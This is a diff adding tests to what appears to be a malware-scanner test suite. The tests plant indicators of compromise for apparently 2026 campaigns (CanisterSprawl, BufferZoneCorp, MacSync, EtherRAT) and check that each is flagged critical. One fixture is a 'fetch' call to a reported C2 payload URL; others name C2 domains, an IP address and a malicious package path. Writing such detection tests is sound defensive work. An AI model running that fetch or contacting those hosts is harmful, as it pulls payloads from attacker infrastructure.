@@ -558,4 +558,98 @@ describe("Campaign Signatures", () => {
       expect(report.riskLevel).toBe("critical");
     });
   });
+
+  // =================================================================
+  // CanisterSprawl npm Worm / TeamPCP Update 008 (April 2026)
+  // =================================================================
+
+  describe("CanisterSprawl npm Worm (TeamPCP Update 008)", () => {
+    it("should detect CanisterSprawl ICP canister C2 domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "payload.js"),
+        'const c2 = "https://whereisitat.lucyatemysuperbox.space/beacon";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
+
+  // =================================================================
+  // BufferZoneCorp Sleeper Packages (Ruby gems + Go modules, May 2026)
+  // =================================================================
+
+  describe("BufferZoneCorp Sleeper Packages", () => {
+    it("should flag BufferZoneCorp GitHub account reference", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "deps.go"),
+        'package main\nimport _ "github.com/BufferZoneCorp/go-retryablehttp"'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
+
+  // =================================================================
+  // MacSync Stealer / Homebrew Malvertising (May 2026)
+  // =================================================================
+
+  describe("MacSync Stealer (Homebrew Malvertising)", () => {
+    it("should detect glowmedaesthetics.com C2 domain", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "loader.js"),
+        'fetch("http://glowmedaesthetics.com/curl/payload");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("should detect MacSync stealer SHA256 hash", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "manifest.js"),
+        'const knownHash = "a4fcfecc5ac8fa57614b23928a0e9b7aa4f4a3b2b3a8c1772487b46277125571";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
+
+  // =================================================================
+  // EtherRAT GitHub Facades (April 2026)
+  // =================================================================
+
+  describe("EtherRAT GitHub Facades", () => {
+    it("should detect EtherRAT fallback C2 IP", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "config.js"),
+        'const fallback = "135.125.255.55";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_IP"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+  });
 });
